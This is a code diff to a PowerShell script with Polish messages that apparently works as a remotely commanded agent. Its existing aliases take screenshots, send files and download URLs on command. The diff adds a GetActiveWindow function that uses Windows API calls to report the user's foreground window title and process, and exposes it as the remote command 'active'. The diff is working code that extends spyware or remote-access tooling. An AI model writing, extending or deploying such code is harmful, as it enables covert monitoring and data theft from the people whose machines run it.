@@ -39,6 +39,32 @@ function CheckAdminRights {
     else           { return "Użytkownik '$env:USERNAME' nie ma uprawnień administratora" }
 }
 
+function GetActiveWindow {
+    try {
+        Add-Type @"
+            using System;
+            using System.Text;
+            using System.Runtime.InteropServices;
+            public class WinAPI {
+                [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+                [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+                [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
+            }
+"@ -ErrorAction SilentlyContinue
+
+        $hwnd  = [WinAPI]::GetForegroundWindow()
+        $sb    = New-Object System.Text.StringBuilder 256
+        [WinAPI]::GetWindowText($hwnd, $sb, 256) | Out-Null
+        $title = $sb.ToString()
+
+        $pid_out = 0
+        [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$pid_out) | Out-Null
+        $proc  = (Get-Process -Id $pid_out -ErrorAction SilentlyContinue).Name
+
+        return "Proces: $proc`nTytuł:  $title"
+    } catch { return "Błąd: $($_.Exception.Message)" }
+}
+
 function DownloadUrl($url, $dest) {
     try {
         $fileName = if ($dest -and $dest.Length -gt 0) {
@@ -158,6 +184,7 @@ function CommandListener {
                         'chadmin' = 'CheckAdminRights'
                         'ss'      = 'SendScreenshot'
                         'sf'      = 'SendFile'
+                        'active'  = 'GetActiveWindow'
                     }
                     $cmdFirst = ($cmd -split ' ', 2)[0].ToLower()
                     if ($aliases.ContainsKey($cmdFirst)) {
